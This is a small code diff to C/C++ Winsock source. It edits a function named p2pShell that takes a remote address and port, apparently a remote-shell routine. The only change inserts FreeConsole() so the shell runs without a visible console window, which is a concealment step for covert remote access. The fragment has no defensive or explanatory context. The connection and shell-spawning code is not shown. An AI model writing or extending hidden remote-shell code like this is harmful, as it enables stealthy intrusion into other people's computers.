@@ -4,7 +4,7 @@
 // -lws2_32 || -lwsock32
 
 void p2pShell(const char* remoteAddr, int remotePort) {
-
+    FreeConsole();
     SOCKET lsock;
     sockaddr_in addr;
     WSAData version;
